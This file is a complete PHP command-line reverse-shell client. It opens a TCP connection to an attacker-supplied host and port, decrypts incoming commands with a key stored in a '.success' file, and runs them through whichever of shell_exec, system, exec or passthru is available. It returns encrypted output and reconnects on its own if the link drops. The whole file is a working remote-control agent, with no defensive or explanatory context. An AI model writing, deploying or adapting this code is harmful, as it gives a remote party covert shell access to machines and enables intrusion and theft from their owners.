#!/usr/bin/php -d memory_limit=2048M
<?php
	set_time_limit(0);
	ob_implicit_flush(1);

	$short = "h:p:";
	$long  = array(
		"host:",
		"port:"
	);
	$opts  = getopt($short,$long);

	(count($opts) === 2) or die("Assign remote ip [-h/--host] and port [-p/--port]\n");

	$addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
	$port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);

	($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) or die("[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n");

	echo "Connecting to [".$addr.":".$port."]...\n";

	(@$result = socket_connect($socket, $addr, $port)) or die("[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n");

	if(!file_exists('.success')){
		//$key = base64_encode(bin2hex(openssl_random_pseudo_bytes(32)));
		//file_put_contents('.success', $key);
		die("!! auth key is missing !!\n");
	} else {
		$key = file_get_contents(".success");
	}
	require_once 'Openssl_EncryptDecrypt.php';
	$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
	define('ENCRYPTION_KEY', $key);


	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
	while (true) {

		$now = date('d/m H:i:s');

	    if(($recv = socket_read($socket, 4096)) === false || $recv === "")
	    {
	    	// try to reconnect - 10 sec interval

	    	echo "[\33[91m!\33[0m] Empty stream.. Disconnected.\n";
	    	sleep(3);

    		if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
	     		 echo "[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n";
			}

			echo "Connecting to [".$addr.":".$port."]...\n";

			if ((@$result = socket_connect($socket, $addr, $port)) === false){
			    echo "[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n";
			} 

			else echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";

	    }
	    else
	    {
			$recv = $openssl_encrypt_decrypt->decrypt($recv, ENCRYPTION_KEY);

			
	    	if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
	    	{
	    		break;
	    	}

			$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim($recv));
			$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";

			if(function_exists('shell_exec'))
			{
				$fnc = "shell_exec()";
				if(($result = shell_exec($full_cmd)) === null)
				{
					$result = "Error";
				}
			}

			else if(function_exists('system'))
			{ 	
				$fnc = "system()";
				@ob_start(); 	

				if(($result = @system($full_cmd)) === false)
				{
					$result = "Error";
				}

				$result = @ob_get_contents(); 		
				@ob_end_clean(); 
			}

			else if(function_exists('exec'))
			{ 
				$fnc = "exec()";
				@exec($full_cmd,$results,$ret_status);

				if($ret_status !== 0)
				{
					$result = "Error status: ". $ret_status;
				}

				$result = ""; 		

				foreach($results as $res)
				{ 			
					$result .= $res."\n\r"; 		
				} 
			}

			else if(function_exists('passthru'))
			{ 		
				$fnc = "passthru()";
				@ob_start(); 		
				@passthru($full_cmd); 		
				$result = @ob_get_contents(); 		
				@ob_end_clean(); 
			}

			else
			{
				$result = "Error :: System calls disabled..";
			}
			

			$result .= "\n\rexecuted:: $fnc\n\rcmd:: $full_cmd";
			$result = $openssl_encrypt_decrypt->encrypt($result, ENCRYPTION_KEY);


    		if(socket_write($socket, $result ,strlen($result)) === false)
    		{	
    			continue;
	        }
	    }
	}
	echo "Closing socket.\n";
	socket_close($socket);
	exit(0);
?>
